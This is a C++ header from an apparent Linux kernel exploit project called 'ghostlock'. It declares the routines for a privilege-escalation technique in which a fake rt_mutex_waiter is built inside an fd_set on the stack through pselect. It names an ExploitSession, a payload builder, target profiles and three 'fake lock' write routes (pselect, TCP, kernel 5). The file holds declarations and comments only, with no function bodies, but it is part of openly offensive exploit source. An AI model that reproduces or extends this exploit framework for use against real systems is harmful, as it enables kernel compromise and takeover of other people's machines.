#ifndef GHOSTLOCK_ROUTE_API_HPP
#define GHOSTLOCK_ROUTE_API_HPP

#include <cstddef>
#include <cstdint>
#include "support/status.hpp"
#include <sys/select.h>

#include "memory/payload_builder.h"
#include "route/route_status.h"

namespace ghostlock::session {
    struct ExploitSession;
} // namespace ghostlock::session

namespace ghostlock::route {
    void fdset_put_word(fd_set *set, int32_t word, uint64_t value);

    uint64_t fdset_get_word(const fd_set *set, int32_t word);

    /* One fd_set word that doubles as a field of the crafted rt_mutex_waiter.
 * `word` is relative to the waiter, not to the fd_set: pselect_put_waiter_word
 * adds the profile's waiter shift before placing it. */
    struct WaiterWord final {
        int32_t word;
        uint64_t value;
        const char *name;
    };

    /* Fills `out` with the waiter words for one layout and returns how many were
 * written (0 when `capacity` is too small). Exposed as a pure function so host
 * tests can assert every layout without a race, a profile or kernel memory.
 * `compact_waiter` is ghostlock::profile::TargetProfile::compact_waiter_kind(). */
    size_t select_stack_waiter_words(
        uint8_t compact_waiter, uintptr_t target, uintptr_t fake_right,
        uintptr_t fake_task, uintptr_t fake_lock, WaiterWord *out,
        size_t capacity) noexcept;

    /* Holds every descriptor below PSELECT_ROUTE_NFDS open on /dev/null so later
 * stages allocate above the fd_set bitmap. Idempotent; call once during setup. */
    void reserve_low_fds(void);

    void reserve_standard_io(void);

    RouteStatus do_pselect_fake_lock_route(const ghostlock::memory::WriteRequest *request);

    RouteStatus do_tcp_fake_lock_route(const ghostlock::memory::WriteRequest *request);

    RouteStatus do_kernel5_fake_lock_route(const ghostlock::memory::WriteRequest *request);
} // namespace ghostlock::route

#endif
